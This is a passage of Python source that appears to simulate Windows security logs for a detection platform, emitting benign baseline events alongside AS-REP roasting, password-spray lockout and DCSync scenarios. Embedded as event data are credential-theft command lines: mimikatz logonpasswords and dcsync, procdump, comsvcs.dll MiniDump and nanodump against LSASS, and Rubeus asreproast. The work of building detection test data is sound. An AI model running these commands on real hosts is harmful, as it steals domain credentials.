    http_spns = [s for s in _SERVICE_ACCOUNT_SPNS if s.startswith("HTTP/")]
    spn = random.choice(http_spns)
    return json.dumps(_build_4769(u, config, service_spn=spn, encryption="0x12"))


def _benign_ldap_query(config, session_context):
    """Workstation queries AD — 4769 TGS for LDAP SPN with AES."""
    u = _pick_windows_user_corr(session_context)
    if not u:
        return None
    ldap_spns = [s for s in _SERVICE_ACCOUNT_SPNS if s.startswith("LDAP/")]
    spn = random.choice(ldap_spns)
    return json.dumps(_build_4769(u, config, service_spn=spn, encryption="0x12"))


def _benign_ntlm_validation(config, session_context):
    """DC validates an NTLM credential request (LogonType 3-ish but from 4776 side)."""
    u = _pick_windows_user(session_context)
    if not u:
        return None
    return json.dumps(_build_4776(u, config, status="0x0"))


def _benign_explicit_cred_runas(config, session_context):
    """User uses runas to launch a process as another local account."""
    u = _pick_windows_user_corr(session_context)
    if not u:
        return None
    target_user = u["username"] + "_admin"
    target_server = "localhost"
    return json.dumps(_build_4648(u, config, target_user=target_user,
                                  target_server=target_server))


def _benign_password_typo(config, session_context):
    """A single 4625 — user mistypes their password once, no lockout."""
    u = _pick_windows_user(session_context)
    if not u:
        return None
    return json.dumps(_build_4625(u, config, logon_type=2,
                                  sub_status="0xC000006A"))


# Benign process creation (4688) — realistic user workstation activity
# Each entry: (process_path, parent_process, command_line_template, weight)
# command_line_template may contain {doc} placeholder filled at runtime.

_BENIGN_DOCS = [
    "Q4-Budget.xlsx", "Presentation-Draft.pptx", "Meeting-Notes.docx",
    "Project-Plan.xlsx", "Status-Report.docx", "Invoice-2026.xlsx",
    "Employee-Handbook.docx", "Sales-Forecast.xlsx", "RFP-Response.docx",
    "Design-Review.pptx", "Onboarding-Checklist.docx", "Expense-Report.xlsx",
]

_BENIGN_URLS = [
    "https://intranet.examplecorp.local/dashboard",
    "https://sharepoint.examplecorp.local/sites/team",
    "https://outlook.office365.com/mail",
    "https://teams.microsoft.com",
    "https://confluence.examplecorp.local/wiki",
    "https://jira.examplecorp.local/browse/PROJ-1234",
]

_BENIGN_PROCESS_TABLE = [
    # ── Office apps (35%) ──
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
     "C:\\Windows\\explorer.exe",
     "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"{doc}\"",
     12),
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
     "C:\\Windows\\explorer.exe",
     "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"{doc}\"",
     10),
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
     "C:\\Windows\\explorer.exe",
     "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
     8),
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE",
     "C:\\Windows\\explorer.exe",
     "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE\" /S \"{doc}\"",
     5),

    # ── Browsers (25%) ──
    ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
     "C:\\Windows\\explorer.exe",
     "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=\"Default\"",
     12),
    ("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
     "C:\\Windows\\explorer.exe",
     "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --single-argument {url}",
     8),
    ("C:\\Program Files\\Mozilla Firefox\\firefox.exe",
     "C:\\Windows\\explorer.exe",
     "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -url {url}",
     5),

    # ── System utilities (20%) ──
    ("C:\\Windows\\System32\\svchost.exe",
     "C:\\Windows\\System32\\services.exe",
     "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
     4),
    ("C:\\Windows\\System32\\svchost.exe",
     "C:\\Windows\\System32\\services.exe",
     "C:\\Windows\\System32\\svchost.exe -k NetworkService -p -s Dnscache",
     3),
    ("C:\\Windows\\System32\\taskhostw.exe",
     "C:\\Windows\\System32\\svchost.exe",
     "taskhostw.exe",
     3),
    ("C:\\Windows\\System32\\conhost.exe",
     "C:\\Windows\\System32\\cmd.exe",
     "\\??\\C:\\Windows\\System32\\conhost.exe 0xffffffff -ForceV1",
     2),
    ("C:\\Windows\\System32\\dllhost.exe",
     "C:\\Windows\\System32\\svchost.exe",
     "C:\\Windows\\System32\\dllhost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
     2),
    ("C:\\Windows\\System32\\RuntimeBroker.exe",
     "C:\\Windows\\System32\\svchost.exe",
     "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding",
     2),
    ("C:\\Windows\\System32\\SearchProtocolHost.exe",
     "C:\\Windows\\System32\\SearchIndexer.exe",
     "\"C:\\Windows\\System32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe",
     2),
    ("C:\\Windows\\explorer.exe",
     "C:\\Windows\\System32\\userinit.exe",
     "C:\\Windows\\explorer.exe",
     1),

    # ── Legitimate admin / dev tools (10%) ──
    ("C:\\Windows\\System32\\cmd.exe",
     "C:\\Windows\\explorer.exe",
     "\"C:\\Windows\\System32\\cmd.exe\" /c dir \\\\fs01\\shared",
     2),
    ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "C:\\Windows\\System32\\svchost.exe",
     "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File C:\\Scripts\\BackupCleanup.ps1",
     2),
    ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "C:\\Windows\\explorer.exe",
     "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"",
     1),
    ("C:\\Windows\\System32\\mstsc.exe",
     "C:\\Windows\\explorer.exe",
     "\"C:\\Windows\\System32\\mstsc.exe\" /v:rdp-gw01.examplecorp.local",
     1),
    ("C:\\Windows\\System32\\mmc.exe",
     "C:\\Windows\\explorer.exe",
     "\"C:\\Windows\\System32\\mmc.exe\" \"C:\\Windows\\System32\\compmgmt.msc\" /s",
     1),

    # ── AV / monitoring / agents (5%) ──
    ("C:\\Program Files\\Windows Defender\\MsMpEng.exe",
     "C:\\Windows\\System32\\services.exe",
     "\"C:\\Program Files\\Windows Defender\\MsMpEng.exe\"",
     2),
    ("C:\\Program Files\\Windows Defender\\MpCmdRun.exe",
     "C:\\Windows\\System32\\svchost.exe",
     "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -SignatureUpdate",
     1),
    ("C:\\Windows\\System32\\MpSigStub.exe",
     "C:\\Windows\\System32\\svchost.exe",
     "MpSigStub.exe /stub 1.1.2606.1 /payload 4.18.2606.1",
     1),

    # ── Scheduled / maintenance (5%) ──
    ("C:\\Windows\\System32\\gpupdate.exe",
     "C:\\Windows\\System32\\svchost.exe",
     "gpupdate.exe /force",
     1),
    ("C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
     "C:\\Windows\\System32\\svchost.exe",
     "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -secured -Embedding",
     1),
    ("C:\\Windows\\System32\\wsqmcons.exe",
     "C:\\Windows\\System32\\svchost.exe",
     "C:\\Windows\\System32\\wsqmcons.exe",
     1),
]


# Object access (4656/4663) and DC account administration (4725/4767)
# 4656/4663 only appear on objects carrying a SACL, so the benign baseline is
# drawn from paths an org would realistically audit: finance, HR and legal
# shares, plus the GPO/NETLOGON trees on SYSVOL.  Without this baseline the
# threat-side LSASS handle access (T1003.001) has nothing to stand out against,
# which is the whole point of emitting the benign side at all.
_AUDITED_FILE_OBJECTS = [
    ("\\\\FS-01\\Finance\\Budgets\\FY26_Forecast.xlsx",      "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"),
    ("\\\\FS-01\\Finance\\Payroll\\Q3_Payroll_Export.csv",   "C:\\Windows\\explorer.exe"),
    ("\\\\FS-01\\HR\\Personnel\\Headcount_Plan.xlsx",        "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"),
    ("\\\\FS-01\\Legal\\Contracts\\MSA_Renewals_2026.docx",  "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
    ("\\\\FS-02\\Engineering\\Designs\\platform_roadmap.pdf","C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe"),
    ("C:\\Windows\\SYSVOL\\sysvol\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\GPT.INI",
     "C:\\Windows\\System32\\svchost.exe"),
]

# Access masks as Windows reports them for the common file operations.
_ACCESS_MASK_READ    = "0x120089"   # ReadData | ReadAttributes | ReadEA | ReadControl | Sync
_ACCESS_MASK_WRITE   = "0x120116"   # WriteData | AppendData | WriteEA | WriteAttributes

# LSASS handle access: the access mask is what separates a credential dump from
# ordinary process inspection.  0x1010 = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
# which is what a memory-dumping tool requests; 0x1fffff is full control.
_LSASS_OBJECT_NAME = "\\Device\\HarddiskVolume2\\Windows\\System32\\lsass.exe"
_CRED_DUMP_ACCESS  = ["0x1010", "0x1410", "0x1fffff"]
_CRED_DUMP_TOOLS = [
    ("C:\\Users\\Public\\procdump64.exe",       "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"),
    ("C:\\Windows\\Temp\\mimikatz.exe",         "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"),
    ("C:\\Users\\Public\\rundll32.exe",         "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 584 C:\\Windows\\Temp\\lsass.dmp full"),
    ("C:\\Windows\\Temp\\nanodump.exe",         "nanodump.exe --write C:\\Windows\\Temp\\nano.dmp"),
]

# Accounts a helpdesk would routinely disable (offboarding) rather than delete.
_OFFBOARD_ACCOUNT_SUFFIXES = ["_contractor", "_temp", "_intern", "_vendor", ""]


def _benign_audited_file_access(config, session_context):
    """Routine access to a SACL-audited file object: 4656 handle then 4663 access.

    4663 always follows a 4656 on the same HandleId in real Windows -- the handle
    must be opened before it can be read -- so both are emitted as a pair sharing
    HandleId, ProcessId and SubjectLogonId.
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    object_name, process_name = random.choice(_AUDITED_FILE_OBJECTS)
    handle_id = "0x%x" % random.randint(0x100, 0xffff)
    process_id = "0x%x" % random.randint(0x200, 0xffff)
    logon_id = _new_logon_id()
    # Reads dominate; writes happen but are the minority on a shared document.
    write = random.random() < 0.25
    t = time.time()

    events = [json.dumps(_build_4656(
        u, config, object_type="File", object_name=object_name,
        process_name=process_name,
        access_mask=_ACCESS_MASK_WRITE if write else _ACCESS_MASK_READ,
        handle_id=handle_id, process_id=process_id, logon_id=logon_id, ts=t))]
    events.append(json.dumps(_build_4663(
        u, config, object_type="File", object_name=object_name,
        process_name=process_name,
        access_mask=_ACCESS_MASK_WRITE if write else _ACCESS_MASK_READ,
        handle_id=handle_id, process_id=process_id, logon_id=logon_id,
        ts=t + random.uniform(0.01, 0.20))))
    return events


def _benign_account_unlock(config, session_context):
    """Helpdesk unlocks a locked-out account -- 4767, emitted by the DC.

    This is the routine counterpart to the 4740 lockout the threat generators
    produce: in a real domain most lockouts are a forgotten password and end
    with an administrator unlocking the account minutes later.
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None
    admin = {"username": random.choice(["svc_helpdesk", "helpdesk.admin", "Administrator"]),
             "hostname": _get_dc_hostname(config)}
    return json.dumps(_build_4767(admin, config, unlocked_by=admin["username"],
                                  ts=time.time()))


def _benign_account_disable(config, session_context):
    """Offboarding: an administrator disables a departing user's account (4725).

    Real offboarding disables an account and leaves it disabled for a retention
    window rather than deleting it, so this is a standalone 4725 with no 4726.
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None
    admin = {"username": random.choice(["svc_hr_sync", "helpdesk.admin", "Administrator"]),
             "hostname": _get_dc_hostname(config)}
    target = f"{u['username']}{random.choice(_OFFBOARD_ACCOUNT_SUFFIXES)}"
    return json.dumps(_build_4725(admin, config,
                                  target_username=target,
                                  target_sid=_stable_user_sid(target),
                                  ts=time.time()))


def _benign_process_creation(config, session_context):
    """Emit 1-3 benign 4688 (process creation) + 4689 (exit) events for
    normal user workstation activity — Office, browsers, system utilities.

    This is the highest-volume event in real Windows environments and
    establishes the UEBA baseline that makes attack tool 4688 events
    (mimikatz, Rubeus, procdump) detectable as anomalous.
    """
    u = _pick_windows_user_corr(session_context)
    if not u:
        return None

    count = random.choices([1, 2, 3], weights=[50, 35, 15], k=1)[0]
    entries = random.choices(
        _BENIGN_PROCESS_TABLE,
        weights=[e[3] for e in _BENIGN_PROCESS_TABLE],
        k=count,
    )

    events = []
    t = time.time()
    for proc_path, parent, cmd_template, _w in entries:
        cmd = cmd_template
        if "{doc}" in cmd:
            cmd = cmd.replace("{doc}", random.choice(_BENIGN_DOCS))
        if "{url}" in cmd:
            cmd = cmd.replace("{url}", random.choice(_BENIGN_URLS))

        events.append(json.dumps(_build_4688(
            u, config,
            process_name=proc_path,
            command_line=cmd,
            parent_process=parent,
            ts=t)))
        t += random.uniform(0.01, 0.05)

        if random.random() < 0.3:
            events.append(json.dumps(_build_4689(
                u, config,
                process_name=proc_path,
                ts=t + random.uniform(5, 600))))

    return events


# DC-specific benign generators (baseline for UEBA)

_DC_SERVICE_ACCOUNTS = [
    ("SYSTEM",          _SID_SYSTEM,       5),
    ("LOCAL SERVICE",   _SID_LOCAL_SERVICE, 5),
    ("NETWORK SERVICE", _SID_NETWORK_SVC,  5),
]

_DC_GP_ATTRIBUTES = [
    ("gPLink",               "2.5.5.12", "LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System"),
    ("gPOptions",            "2.5.5.9",  "0"),
    ("whenChanged",          "2.5.5.11", ""),
    ("uSNChanged",           "2.5.5.16", ""),
    ("dSCorePropagationData","2.5.5.11", ""),
    ("msDS-RevealedUsers",   "2.5.5.7",  ""),
    ("msDS-NcType",          "2.5.5.9",  "0"),
]

_DC_GP_OBJECT_CLASSES = [
    "domainDNS", "organizationalUnit", "groupPolicyContainer",
    "container", "builtinDomain",
]


def _benign_dc_kerberos_traffic(config, session_context):
    """Steady-state Kerberos auth on the DC — TGT renewals, TGS for services.

    A real DC sees hundreds of 4768+4769 pairs per minute from normal user
    activity.  This generator produces 2-5 pairs per call, mimicking routine
    auth cycles from random users.
    """
    users = [_pick_windows_user(session_context) for _ in range(random.randint(2, 5))]
    users = [u for u in users if u]
    if not users:
        return None

    events = []
    t = time.time() - len(users) * 0.5

    for u in users:
        events.append(json.dumps(
            _build_4768(u, config, ip_override=u.get("ip"), ts=t)))
        t += random.uniform(0.01, 0.05)

        spn = random.choice(_SERVICE_ACCOUNT_SPNS)
        events.append(json.dumps(
            _build_4769(u, config, service_spn=spn, encryption="0x12", ts=t)))
        t += random.uniform(0.2, 1.5)

        if random.random() < 0.3:
            spn2 = random.choice(_SERVICE_ACCOUNT_SPNS)
            events.append(json.dumps(
                _build_4769(u, config, service_spn=spn2, encryption="0x12", ts=t)))
            t += random.uniform(0.1, 0.4)

    return events


def _benign_dc_directory_service(config, session_context):
    """Normal directory service modifications on the DC — GPO refreshes,
    replication metadata updates, attribute housekeeping.

    These are the routine 5136 events that build the UEBA baseline, so
    the dMSA attack's msDS-ManagedAccountPrecededByLink stands out as
    anomalous.  Real DCs emit dozens of these per minute.
    """
    dc_host = _get_dc_hostname(config)
    dc_short = _get_dc_short(config)
    domain = _get_domain(config)
    dns_domain = _get_dns_domain(config)
    base_dn = ",".join(f"DC={p}" for p in dns_domain.split("."))
    dc_user = {
        "username": dc_short + "$",
        "hostname": dc_host,
        "ip": "127.0.0.1",
    }

    events = []
    t = time.time() - random.uniform(0, 2)
    op_correlation_id = _new_logon_guid()
    logon_id = _new_logon_id()
    n_mods = random.randint(1, 4)

    for _ in range(n_mods):
        attr_name, syntax_oid, default_val = random.choice(_DC_GP_ATTRIBUTES)
        obj_class = random.choice(_DC_GP_OBJECT_CLASSES)

        if attr_name in ("whenChanged", "dSCorePropagationData"):
            from datetime import datetime, timezone
            attr_value = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S.0Z")
        elif attr_name == "uSNChanged":
            attr_value = str(random.randint(100000, 9999999))
        elif default_val:
            attr_value = default_val
        else:
            attr_value = "-"

        ou_names = ["Domain Controllers", "Users", "Computers", "Servers"]
        obj_dn = f"OU={random.choice(ou_names)},{base_dn}"
        if obj_class == "groupPolicyContainer":
            gpo_guid = str(uuid.uuid4())
            obj_dn = f"CN={{{gpo_guid}}},CN=Policies,CN=System,{base_dn}"

        events.append(json.dumps(
            _build_5136(dc_user, config,
                        object_dn=obj_dn,
                        object_class=obj_class,
                        object_guid=_new_logon_guid(),
                        attribute_name=attr_name,
                        attribute_value=attr_value,
                        attribute_syntax_oid=syntax_oid,
                        op_correlation_id=op_correlation_id,
                        logon_id=logon_id,
                        ts=t)))
        t += random.uniform(0.001, 0.01)

    return events


def _benign_dc_service_activity(config, session_context):
    """Built-in service account logons on the DC — SYSTEM, DNS, DFSR, health
    mailbox, etc.  These fire constantly as Windows services start, renew
    credentials, or perform internal operations.

    Produces a type-5 (service) 4624 + 4672 pair from a DC built-in account.
    """
    dc_host = _get_dc_hostname(config)
    dc_short = _get_dc_short(config)
    domain = _get_domain(config)

    svc_acct, svc_sid, logon_type = random.choice(_DC_SERVICE_ACCOUNTS)
    dc_svc_user = {
        "username": svc_acct,
        "hostname": dc_host,
        "ip": "127.0.0.1",
    }

    events = []
    t = time.time()
    logon_id = _new_logon_id()

    events.append(json.dumps(
        _build_4624(dc_svc_user, config,
                    logon_type=logon_type,
                    auth_pkg=_NEG_PACKAGE,
                    workstation_override=dc_host,
                    ip_override="-",
                    target_logon_id=logon_id,
                    ts=t)))
    t += 0.01

    events.append(json.dumps(
        _build_4672(dc_svc_user, config,
                    logon_id=logon_id,
                    is_service=True,
                    ts=t)))

    if random.random() < 0.4:
        t += random.uniform(0.01, 0.05)
        machine_user = {**dc_svc_user, "username": dc_short + "$"}
        events.append(json.dumps(
            _build_4768(machine_user, config,
                        ip_override="::1", ts=t)))

    return events


# Benign generators by name. Ambient scheduling -- which run, and how often -- lives in
# the per-host worker tables _DC_BENIGN_GENS / _WKS_BENIGN_GENS (see generate_log).
_BENIGN_GENERATORS = {
    "interactive_logon":    _benign_interactive_logon,
    "network_share_logon":  _benign_network_share_logon,
    "workstation_unlock":   _benign_workstation_unlock,
    "logoff":               _benign_logoff,
    "service_logon":        _benign_service_logon,
    "scheduled_task_logon": _benign_scheduled_task_logon,
    "cached_logon":         _benign_cached_logon,
    "rdp_logon":            _benign_rdp_logon,
    "sql_access":           _benign_sql_access,
    "web_app_access":       _benign_web_app_access,
    "ldap_query":           _benign_ldap_query,
    "ntlm_validation":      _benign_ntlm_validation,
    "explicit_cred_runas":  _benign_explicit_cred_runas,
    "password_typo":        _benign_password_typo,
    "dc_self_logon":        _benign_dc_self_logon,
    "dc_kerberos_traffic":  _benign_dc_kerberos_traffic,
    "dc_directory_service": _benign_dc_directory_service,
    "dc_service_activity":  _benign_dc_service_activity,
    "process_creation":     _benign_process_creation,
    "audited_file_access":  _benign_audited_file_access,
    "account_unlock":       _benign_account_unlock,
    "account_disable":      _benign_account_disable,
    "scheduled_task_create": _benign_scheduled_task_create,
    "service_install":      _benign_service_install,
}


# Threat generators
#
# Every threat generator returns a list of JSON strings so the transport
# layer emits them all in one call.  Detection-completeness patterns follow
# the same convention as the other LogSim modules: brute-force sequences
# always end with a successful authentication so XSIAM UEBA triggers on the
# failure→success transition.


_ASREP_EXTRA_TARGETS = [
    "svc_legacy", "svc_oldapp", "svc_ftp_legacy", "svc_ndes",
    "svc_print_legacy", "svc_kiosk", "app_readonly", "app_batch",
    "test_user01", "test_user02", "test_svc", "dev_deploy",
    "scan_agent", "report_svc", "monitor_legacy", "backup_old",
    "migration_svc", "staging_app", "qa_automation", "build_agent",
    "ldap_browser", "sync_svc", "repl_monitor", "audit_legacy",
    "helpdesk_svc", "inventory_svc", "patch_agent", "asset_scan",
    "nessus_svc", "splunk_fwd",
]


def _threat_as_rep_roasting(config, session_context):
    """AS-REP Roasting: attacker enumerates accounts with pre-auth disabled.

    Sequence:
      1. Attacker authenticates from their own machine → 4768 TGT (normal)
      2. Attacker's session starts → 4624 + 4672 (elevated)
      3. 4688 attack tool process (Rubeus/GetNPUsers)
      4. Burst of 30-50 4768 TGT requests for many different users with
         PreAuthType=0 (no pre-auth) and weak encryption — all from the
         same source IP.
      5. 4689 process exit + 4634 logoff

    Detection keys:
      - Many 4768 events for distinct TargetUserNames from a single IP
      - PreAuthType = 0 (Kerberos pre-auth disabled / not required)
      - Weak encryption types (RC4/DES) on the ticket responses
      - All requests hit the DC in rapid succession
    """
    users = _get_windows_users(session_context)
    if not users:
        return None
    attacker = random.choice(users)
    src_ip = attacker.get("ip") or "10.0.0.1"

    target_usernames = [u["username"] for u in _peer_windows_users(session_context, attacker["username"])]
    target_usernames += _ASREP_EXTRA_TARGETS[:]
    random.shuffle(target_usernames)
    target_usernames = target_usernames[:random.randint(40, 55)]

    events = []
    t = time.time() - len(target_usernames)

    logon_id = _new_logon_id()

    events.append(json.dumps(_build_4768(attacker, config, ip_override=src_ip, ts=t)))
    t += 1.0
    events.append(json.dumps(_dc_logon_event(attacker, config, ip_override=src_ip,
                                             logon_id=logon_id, ts=t)))
    t += 1.2
    events.append(json.dumps(_build_4624(attacker, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         ip_override=src_ip, elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(attacker, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = ("C:\\Users\\Public\\Rubeus.exe",
            "C:\\Users\\Public\\Rubeus.exe asreproast /format:hashcat /nowrap")
    events.append(json.dumps(_build_4688(attacker, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    vuln_count = random.randint(3, 6)
    vuln_users = set(random.sample(target_usernames, k=min(vuln_count, len(target_usernames))))

    for uname in target_usernames:
        fake_user = {"username": uname, "ip": src_ip, "hostname": attacker.get("hostname", "WKS001")}
        if uname in vuln_users:
            ev = _build_4768(fake_user, config, ip_override=src_ip,
                             encryption="0x17", ts=t)
            ev["event_data"]["PreAuthType"] = "0"
            ev["event_data"]["TicketOptions"] = "0x40800010"
            events.append(json.dumps(ev))
        else:
            events.append(json.dumps(_build_4771(fake_user, config,
                                                  status="0x18",
                                                  ip_override=src_ip, ts=t)))
        t += random.uniform(0.1, 0.4)

    events.append(json.dumps(_build_4689(attacker, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(60, 300)
    session = _pop_open_session(attacker["hostname"], attacker["username"])
    if session:
        events.append(json.dumps(_build_4634(session, config, ts=t)))

    return events


def _threat_account_lockout(config, session_context):
    """Multiple users locked out from a single source host — password spray
    that triggers account lockout for each targeted user.

    XSIAM detection: "Excessive User Lockouts" — a high number of 4740
    events sharing the same source host (TargetDomainName) in a short window.

    All DC-side events (4771, 4776, 4625, 4740) use:
      - computer_name = DC hostname (DC logs them)
      - IpAddress     = attacker's IP  (single source)
      - Workstation   = attacker's hostname
    """
    users = _get_windows_users(session_context)
    if not users:
        return None
    attacker = random.choice(users)
    peers = _peer_windows_users(session_context, attacker["username"], need=4)
    if len(peers) < 4:
        return None
    num_victims = random.randint(4, 8)
    victims = random.sample(peers, k=min(len(peers), num_victims))

    attacker_ip = attacker.get("ip") or "10.0.1.200"
    attacker_hostname = attacker.get("hostname", "WKS-ATTACK01").split(".")[0].upper()
    dc_host = _get_dc_hostname(config)

    events = []
    t = time.time() - num_victims * 60

    for victim in victims:
        attempts = random.randint(8, 12)
        for _ in range(attempts):
            events.append(json.dumps(_build_4771(victim, config, status="0x18",
                                                 ip_override=attacker_ip, ts=t)))
            events.append(json.dumps(_build_4776(victim, config, status="0xC000006A",
                                                 workstation=attacker_hostname, ts=t + 0.8)))
            events.append(json.dumps(_build_4625(victim, config, logon_type=3,
                                                 sub_status="0xC000006A",
                                                 workstation_override=dc_host,
                                                 source_workstation=attacker_hostname,
                                                 ip_override=attacker_ip, ts=t + 1.5)))
            t += random.uniform(3, 8)
        events.append(json.dumps(_build_4740(victim, config,
                                             source_workstation=attacker_hostname, ts=t)))
        events.append(json.dumps(_build_4625(victim, config, logon_type=3,
                                             status="0xC0000234", sub_status="0x0",
                                             workstation_override=dc_host,
                                             source_workstation=attacker_hostname,
                                             ip_override=attacker_ip, ts=t + 2.0)))
        t += random.uniform(2, 5)
    return events


_SUSPICIOUS_LOCKOUT_ACCOUNTS = [
    "svc_sql_prod", "svc_sql_dev", "svc_iis", "svc_sharepoint",
    "svc_backup", "svc_monitoring", "svc_jenkins", "svc_reporting",
    "svc_crm", "svc_etl",
    "admin.backup", "admin.helpdesk", "admin.network",
    "Administrator", "da_admin", "tier0_admin",
]


def _threat_suspicious_account_lockout(config, session_context):
    """Service / admin / privileged accounts locked out from a single source
    host — significantly more suspicious than regular user lockouts.

    XSIAM detection: "Excessive account lockouts on suspicious users" —
    same trigger as regular lockout (multiple 4740 from one source) but
    elevated to Medium severity because the locked accounts are service
    accounts, admin accounts, or users with existing UEBA risk scores.

    All DC-side events (4771, 4776, 4625, 4740) use:
      - computer_name = DC hostname (DC logs them)
      - IpAddress     = attacker's IP  (single source)
      - Workstation   = attacker's hostname
    """
    all_users = _get_windows_users(session_context)
    if not all_users:
        return None

    dc_host = _get_dc_hostname(config)

    num_victims = random.randint(4, 7)
    svc_accounts = random.sample(
        _SUSPICIOUS_LOCKOUT_ACCOUNTS,
        k=min(len(_SUSPICIOUS_LOCKOUT_ACCOUNTS), num_victims))

    attacker = random.choice(all_users)
    attacker_ip = attacker.get("ip") or "10.0.1.200"
    attacker_hostname = attacker.get("hostname", "WKS-ATTACK01").split(".")[0].upper()

    events = []
    t = time.time() - num_victims * 60

    for acct_name in svc_accounts:
        svc_user = {
            "username": acct_name,
            "hostname": dc_host,
            "ip": attacker_ip,
        }
        attempts = random.randint(6, 10)
        for _ in range(attempts):
            events.append(json.dumps(_build_4771(svc_user, config, status="0x18",
                                                 ip_override=attacker_ip, ts=t)))
            events.append(json.dumps(_build_4776(svc_user, config, status="0xC000006A",
                                                 workstation=attacker_hostname, ts=t + 0.8)))
            events.append(json.dumps(_build_4625(svc_user, config, logon_type=3,
                                                 sub_status="0xC000006A",
                                                 workstation_override=dc_host,
                                                 source_workstation=attacker_hostname,
                                                 ip_override=attacker_ip, ts=t + 1.5)))
            t += random.uniform(3, 8)
        events.append(json.dumps(_build_4740(svc_user, config,
                                             source_workstation=attacker_hostname, ts=t)))
        events.append(json.dumps(_build_4625(svc_user, config, logon_type=3,
                                             status="0xC0000234", sub_status="0x0",
                                             workstation_override=dc_host,
                                             source_workstation=attacker_hostname,
                                             ip_override=attacker_ip, ts=t + 2.0)))
        t += random.uniform(2, 5)
    return events


# DCSync replication GUIDs (DS-Replication-Get-Changes family)
_GUID_REPL_GET_CHANGES     = "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}"
_GUID_REPL_GET_CHANGES_ALL = "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}"
_GUID_REPL_IN_FILTERED_SET = "{89e95b76-444d-4c62-991a-0facbeda640c}"


def _threat_dcsync(config, session_context):
    """DCSync: attacker uses DS-Replication-Get-Changes to extract password
    hashes directly from a domain controller, mimicking DC replication.

    Sequence:
      1. Attacker authenticates → 4624 + 4672
      2. 4688 Mimikatz process creation (lsadump::dcsync)
      3. DC logs 4662 (Directory Service Access) with replication GUIDs —
         this is THE detection signal. Normal users never request replication.
      4. Multiple 4662 events for different target objects (krbtgt, admin accts)
      5. 4689 process exit

    Detection keys:
      - 4662 with Properties containing Replication-Get-Changes GUID from
        a non-DC machine account
      - SubjectUserName is a regular user/admin, NOT a DC$ machine account
      - ObjectName targets sensitive AD objects (CN=krbtgt, Domain Admins)
      - Sigma/Sentinel/Splunk all have dedicated DCSync rules for this
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    dns_domain = _get_dns_domain(config)
    domain = _get_domain(config)
    dc_parts = dns_domain.split(".")
    base_dn = ",".join(f"DC={p}" for p in dc_parts)
    events = []
    t = time.time()

    logon_id = _new_logon_id()
    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    events.append(json.dumps(_build_4688(u, config,
                                         process_name="C:\\Users\\Public\\mimikatz.exe",
                                         command_line='mimikatz.exe "lsadump::dcsync /user:krbtgt"',
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(1.0, 3.0)

    targets = [
        f"CN=krbtgt,CN=Users,{base_dn}",
        f"CN=Administrator,CN=Users,{base_dn}",
        f"CN=Domain Admins,CN=Users,{base_dn}",
        f"{base_dn}",
    ]
    for obj in targets:
        props = (f"{_GUID_REPL_GET_CHANGES}\n    "
                 f"{_GUID_REPL_GET_CHANGES_ALL}\n    "
                 f"{_GUID_REPL_IN_FILTERED_SET}\n")
        events.append(json.dumps(_build_4662(
